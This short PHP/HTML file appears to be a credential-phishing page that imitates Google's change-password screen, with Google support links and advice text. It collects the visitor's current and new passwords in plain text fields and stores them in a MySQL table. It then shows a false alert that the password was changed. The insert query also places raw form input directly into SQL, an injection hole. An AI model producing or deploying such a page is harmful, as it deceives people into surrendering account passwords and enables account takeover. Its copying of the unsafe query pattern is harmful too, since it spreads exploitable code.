<!DOCTYPE html>
<body>
    <img src="lolol.jpg" width= "1500">
</body>
<form action="" method="post">      
<link rel="stylesheet" href="style.css"> 
<hr >
<div>
    <class="btFaIb"> Choose a strong password and don't reuse it for other accounts. <a href="https://support.google.com/accounts?p=pw_dont_reuse&amp;hl=en" target="_blank" class="qerXTe" rel="noreferrer noopener">Learn more</a> <class="aJvDTb lY6Rwe">Changing your password will sign you out on your devices, with some <a href="" jsname="MbOGVb" jsaction="click:fM7I8d;">exceptions</a>.</div> 
    
<table>
    <tr>       
        <td><i> <input type="text" placeholder="   Password Recently" name="recentPassword" style="height: 55px; width: 500px; border: 1px solid black; border-radius: 4px; "></td>
    </tr>
    <tr>
        <td> <b> Password strength: </td>
    </tr>
    <tr>    
        <td> <p> Use at least 8 characters. Don’t use a password from another site, or something too obvious like your pet’s name. <a href="https://support.google.com/accounts?p=pw_signup&amp;hl=en" aria-label="Learn how to create a strong password" target="_blank">Why? </a></td>
    </tr>
    <tr>
        <td><i> <input type="text" placeholder="   New Password" name="New_password" style="height: 55px; width: 500px; border: 1px solid black; border-radius: 4px; "></td>
    </tr>
    <tr>
        <td>
             <g><input type="submit" style="background-color:RoyalBlue; margin-left: 332px; 30px; border-radius:4px; 
        border-color:RoyalBlue; width: 169px; height: 36px; font-size: 15px; color:white" value="Change password" name="submit"></td>
    </tr>  
</table>
</form>

<?php
include "koneksi.php";

if(isset($_POST['submit'])){
    mysqli_query($koneksi,"insert into tabita set
    passwordRecently = '$_POST[recentPassword]',
    Newpassword = '$_POST[New_password]'");

    echo "<script type ='text/javascript'>
            alert('your password has been changed, please close the tab')
        </script>";

}
?>
